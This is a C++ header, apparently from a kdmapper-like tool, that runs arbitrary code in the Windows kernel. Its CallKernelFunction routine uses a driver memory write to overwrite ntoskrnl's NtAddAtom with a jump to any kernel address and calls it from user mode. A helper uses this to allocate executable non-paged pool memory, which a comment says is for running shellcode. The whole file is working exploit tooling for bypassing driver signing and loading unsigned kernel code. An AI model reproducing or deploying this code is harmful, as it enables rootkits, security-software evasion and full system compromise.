#pragma once
#include <windows.h>
#include <map>
#include "Singleton.hpp"
#include "ObjectProxy.hpp"
#include "DriverWorker.hpp"
#include "Log.hpp"

#ifndef POOL_FLAG_NON_PAGED_EXECUTE
#define POOL_FLAG_NON_PAGED_EXECUTE       0x0000000000000080UI64     // Non paged pool executable
#endif

#ifndef NonPagedPool
#define NonPagedPool (0)
#endif


constexpr static ULONG Tag = 'mmpM';
#ifndef SystemModuleInformation
#define SystemModuleInformation 11
#endif

class KernelUtils final : public Singleton<KernelUtils>
{
	friend class Singleton<KernelUtils>;

public:
	explicit KernelUtils(Token) noexcept : KernelUtils()
	{
	}


	PVOID
	GetKernelModuleBase(const std::string& KernelModuleName) const;

	DWORD GetExportFunctionOffset(const std::string& FunctionName)
	{
		auto cache = GetExportFunctionOffsetCache();
		auto it = cache.find(FunctionName);
		if (it != cache.end())
		{
			return it->second;
		}
		return 0;
	}

private:
	KernelUtils() noexcept = default;
	std::map<std::string, DWORD> GetExportFunctionOffsetCache();

private:
	std::map<std::string, DWORD> m_mapOfExportOffsetsCache{};
};

inline ObjectProxy<KernelUtils> g_KernelUtils;

template<typename T, typename ...A>
bool
CallKernelFunction(T* outResult, uint64_t KernelFunctionAddress, const A ...arguments)
{
	constexpr auto callVoid = std::is_same_v<T, void>;

	if constexpr (!callVoid)
	{
		if (!outResult)
		{
			LOG("[-] Output result pointer is null." << std::endl);
			return false;
		}
	}
	else
	{
		UNREFERENCED_PARAMETER(outResult);
	}

	if (!KernelFunctionAddress)
	{
		LOG("[-] Invalid kernel function address." << std::endl);
		return false;
	}

	// Setup function call
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == 0)
	{
		LOG("[-] Failed to get handle for ntdll.dll" << std::endl);
		return false;
	}

	const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
	if (!NtAddAtom)
	{
		LOG("[-] Failed to get address for ntdll.NtAddAtom" << std::endl);
		return false;
	}

	unsigned char kernelInjectedJmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
	unsigned char originalKernelFunction[sizeof(kernelInjectedJmp)]{ 0 };
	*(ULONG64*)&kernelInjectedJmp[2] = KernelFunctionAddress;

	const auto kernelBase = g_KernelUtils->GetKernelModuleBase("ntoskrnl.exe");
	if (!kernelBase)
	{
		LOG("[-] Failed to get kernel module base for ntoskrnl.exe" << std::endl);
		return false;
	}

	const auto nNtAddAtomOffset = g_KernelUtils->GetExportFunctionOffset("NtAddAtom");
	if (!nNtAddAtomOffset)
	{
		LOG("[-] Failed to get NtAddAtom offset" << std::endl);
		return false;
	}

	static auto pNtAddAtom = reinterpret_cast<ULONG64>(kernelBase) + nNtAddAtomOffset;
	if (!pNtAddAtom)
	{
		LOG("[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
		return false;
	}

	if (!DriverWorker::Read(reinterpret_cast<PVOID>(pNtAddAtom),
		                    &originalKernelFunction,
		                    sizeof(kernelInjectedJmp)))
	{
		LOG("[-] Failed to read original kernel function code" << std::endl);
		LOG("error address: " << std::hex << pNtAddAtom << std::dec << std::endl);
		return false;
	}

	if (originalKernelFunction[0] == kernelInjectedJmp[0] &&
		originalKernelFunction[1] == kernelInjectedJmp[1] &&
		originalKernelFunction[sizeof(kernelInjectedJmp) - 2] == kernelInjectedJmp[sizeof(kernelInjectedJmp) - 2] &&
		originalKernelFunction[sizeof(kernelInjectedJmp) - 1] == kernelInjectedJmp[sizeof(kernelInjectedJmp) - 1])
	{
		LOGW(L"[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl);
		return false;
	}

	// Overwrite the pointer with kernel_function_address
	if (!DriverWorker::Write(reinterpret_cast<PVOID>(pNtAddAtom),
							 &kernelInjectedJmp,
							 sizeof(kernelInjectedJmp)))
	{
		LOG("[-] Failed to write kernel function call code" << std::endl);
		LOG("error address: " << std::hex << pNtAddAtom << std::dec << std::endl);
		return false;
	}

	// Call function
	if constexpr (!callVoid)
	{
		using FunctionFn = T(__stdcall*)(A...);
		const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

		*outResult = Function(arguments...);
	}
	else
	{
		using FunctionFn = void(__stdcall*)(A...);
		const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

		Function(arguments...);
	}

	// Restore the pointer/jmp
	if (!DriverWorker::Write(reinterpret_cast<PVOID>(pNtAddAtom),
							 originalKernelFunction,
							 sizeof(kernelInjectedJmp)))
	{
		LOG("[-] Failed to restore original kernel function code" << std::endl);
		LOG("error address: " << std::hex << pNtAddAtom << std::dec << std::endl);
		return false;
	}


	return true;
}

static
PVOID AllocatePool2(size_t size)
{

	ULONG64 pAlloc2 = (ULONG64)g_KernelUtils->GetKernelModuleBase("ntoskrnl.exe") +
								g_KernelUtils->GetExportFunctionOffset("ExAllocatePool2");
	if (pAlloc2)
	{
		ULONG64 pAlloc{ 0 };
		if (CallKernelFunction(&pAlloc,
			pAlloc2,
			POOL_FLAG_NON_PAGED_EXECUTE, // must be using it because we need to execute the shellcode in the allocated memory, otherwise it will cause BSOD with PAGE_FAULT_IN_NONPAGED_AREA when executing the shellcode.
			size,
			Tag))
		{
			//LOG("[+] ExAllocatePool2 called successfully, allocated memory at: " << std::hex << pAlloc << std::dec << std::endl);

			return reinterpret_cast<PVOID>(pAlloc);
		}
		else
		{
			//LOG("[-] Failed to call ExAllocatePool2" << std::endl);

			return nullptr;
		}
	}
	else
	{
		//LOG("[-] Failed to get export ExAllocatePool2" << std::endl);
		auto pExAllocatePoolWithTag = (ULONG64)g_KernelUtils->GetKernelModuleBase("ntoskrnl.exe") + 
												g_KernelUtils->GetExportFunctionOffset("ExAllocatePoolWithTag");
		if (pExAllocatePoolWithTag)
		{
			ULONG64 pAlloc{ 0 };
			if (CallKernelFunction(&pAlloc,
				pExAllocatePoolWithTag,
				NonPagedPool,
				size,
				Tag))
			{
				//LOG("[+] ExAllocatePoolWithTag called successfully, allocated memory at: " << std::hex << pAlloc << std::dec << std::endl);
				return reinterpret_cast<PVOID>(pAlloc);
			}
		}

		return nullptr;
	}

	return nullptr;
}